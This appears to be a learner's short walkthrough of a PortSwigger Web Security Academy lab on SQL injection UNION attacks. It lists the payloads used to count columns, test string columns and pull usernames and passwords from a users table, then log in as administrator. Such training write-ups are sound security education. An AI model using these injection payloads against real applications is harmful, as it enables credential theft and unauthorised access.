LAB NAME: SQL injection UNION attack, retrieving data from other tables

DESCRIPTION
This lab contains a SQL injection vulnerability in the product category filter. The results from the query are returned in the application's 
response, so you can use a UNION attack to retrieve data from other tables. To construct such an attack, you need to combine some of the 
techniques you learned in previous labs.

The database contains a different table called users, with columns called username and password.

To solve the lab, perform a SQL injection UNION attack that retrieves all usernames and passwords, and use the information to log in as the 
administrator user.

DIFFICULTY LEVEL: Practitioner

LAB LINK: https://portswigger.net/web-security/sql-injection/union-attacks/lab-retrieve-data-from-other-tables

STEPS I USED TO SOLVE THIS LAB
- '+UNION+SELECT+NULL,NULL-- : to check number of columns
- '+UNION+SELECT+'a',NULL-- and  '+UNION+SELECT+NULL,'a'-- : to check if both columns accept string data.
- '+UNION+SELECT+username,password+FROM+users-- : to get the username and password from the users table
- The administrator's password showed along with that of other users. That is what I used to log in and solve the lab.
